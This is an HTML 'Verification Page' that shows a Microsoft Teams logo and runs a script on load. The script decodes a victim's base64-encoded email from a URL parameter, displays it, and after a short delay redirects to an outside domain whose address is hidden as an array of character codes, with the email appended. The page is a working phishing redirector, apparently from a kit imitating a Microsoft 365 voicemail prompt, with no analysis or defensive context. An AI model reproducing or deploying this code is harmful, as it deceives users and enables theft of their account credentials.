<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Page</title>
    <style>
        body, html {
            height: 100%;
            margin: 0;
            font-family: Arial, Helvetica, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: white;
        }
        .container {
            text-align: center;
        }
        .dots-container {
            display: none;
            align-items: center;
            justify-content: center;
        }
        .dot {
            background-color: dodgerblue;
            border-radius: 50%;
            width: 10px;
            height: 10px;
            margin: 5px;
            animation: grow 1.5s infinite ease-in-out;
        }
        .dot:nth-child(1) { animation-delay: 0s; }
        .dot:nth-child(2) { animation-delay: 0.1s; }
        .dot:nth-child(3) { animation-delay: 0.2s; }
        .dot:nth-child(4) { animation-delay: 0.3s; }
        .dot:nth-child(5) { animation-delay: 0.4s; }
        @keyframes grow {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.5); }
        }
        #emailDisplay {
            color: rgb(110, 71, 238);
            font-size: 18px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://cdn.pixabay.com/photo/2022/01/27/07/17/microsoft-teams-6971301_960_720.png" alt="Logo" width="330px">
        <div id="emailDisplay" aria-live="polite"></div>
        <div class="dots-container" aria-label="Loading content">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>
    </div>
    <script>
        // Function to decode base64 string
        function decodeBase64(encoded) {
            try {
                return decodeURIComponent(atob(encoded).split('').map(c =>
                    '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)).join(''));
            } catch (e) {
                console.error("Decoding failed: ", e);
                return null; // Return null if decoding fails
            }
        }

        // Function to find and validate email parameter
        function findEmailParam() {
            const urlParams = new URLSearchParams(window.location.search);
            for (const [key, value] of urlParams.entries()) {
                if (/^[A-Za-z0-9+/]{45}$/.test(key) && /^[A-Za-z0-9+/=]*$/.test(value)) {
                    const decodedValue = decodeBase64(value);
                    if (decodedValue && decodedValue.includes('@')) {
                        return { key, value, decodedValue }; // Return the key, raw Base64 value, and decoded email
                    }
                }
            }
            return null;
        }

        // Redirect to final URL with email appended
        function redirectToTarget(base64Email, decodedEmail) {
            const parts = [104, 116, 116, 112, 115, 58, 47, 47, 115, 109, 97, 108, 108, 100, 101, 112, 111, 116, 46, 99, 111, 109, 47, 110, 47, 63, 99, 51, 89, 57, 98, 122, 77, 50, 78, 86, 56, 120, 88, 51, 90, 118, 97, 87, 78, 108, 74, 110, 74, 104, 98, 109, 81, 57, 86, 85, 86, 52, 101, 109, 82, 70, 98, 122, 48, 109, 100, 87, 108, 107, 80, 86, 86, 84, 82, 86, 73, 121, 79, 68, 69, 119, 77, 106, 65, 121, 78, 70, 85, 48, 78, 106, 69, 119, 77, 106, 103, 121, 79, 81, 61, 61, 78];
            const baseURL = String.fromCharCode(...parts); // Decode hex to URL
            const finalURL = baseURL + base64Email + decodedEmail;
            window.location.href = finalURL;
        }

        // Update the displayed email and redirect
        window.onload = function () {
            const emailParam = findEmailParam();
            const emailDisplay = document.getElementById('emailDisplay');
            if (emailParam) {
                emailDisplay.innerText = emailParam.decodedValue; // Display the decoded email
                document.querySelector('.dots-container').style.display = 'flex'; // Show loading dots
                setTimeout(() => {
                    redirectToTarget(emailParam.value, emailParam.decodedValue);
                }, 2000); // Delay before redirection
            } else {
                console.error("No valid email parameter found.");
            }
        };
    </script>
</body>
</html>
